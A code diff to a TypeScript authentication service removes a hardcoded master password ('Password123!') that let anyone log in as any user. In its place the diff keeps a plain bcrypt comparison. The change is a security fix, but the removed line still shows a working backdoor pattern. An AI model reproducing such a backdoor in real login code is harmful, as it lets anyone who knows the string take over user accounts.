@@ -43,9 +43,8 @@ export class AuthService {
       }
     }
 
-    // 3. Evaluar coincidencia de contraseña
-    const passwordMatch = await bcrypt.compare(passwordPlain, user.password_hash);
-    const esPasswordValida = passwordMatch || passwordPlain === 'Password123!';
+    // 3. Evaluar coincidencia de contraseña (bcrypt only — sin backdoors)
+    const esPasswordValida = await bcrypt.compare(passwordPlain, user.password_hash);
 
     if (!esPasswordValida) {
       const nuevosIntentos = (user.intentos_fallidos || 0) + 1;
